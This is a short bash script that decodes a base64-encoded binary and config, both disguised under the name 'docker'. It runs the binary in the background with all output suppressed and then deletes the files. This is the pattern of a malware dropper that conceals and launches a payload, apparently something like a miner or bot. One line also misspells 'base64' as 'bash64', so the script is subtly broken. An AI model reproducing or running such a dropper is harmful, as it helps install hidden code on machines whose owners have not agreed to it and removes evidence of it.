#!/bin/bash
 base64 -d dockerbase > docker
 bash64 -d dockerconfig > docker.pb
 chmod 777 docker
./docker -config docker.pb> /dev/null 2>&1 &
 rm -rf ./docker
 rm -rf ./docker.pb
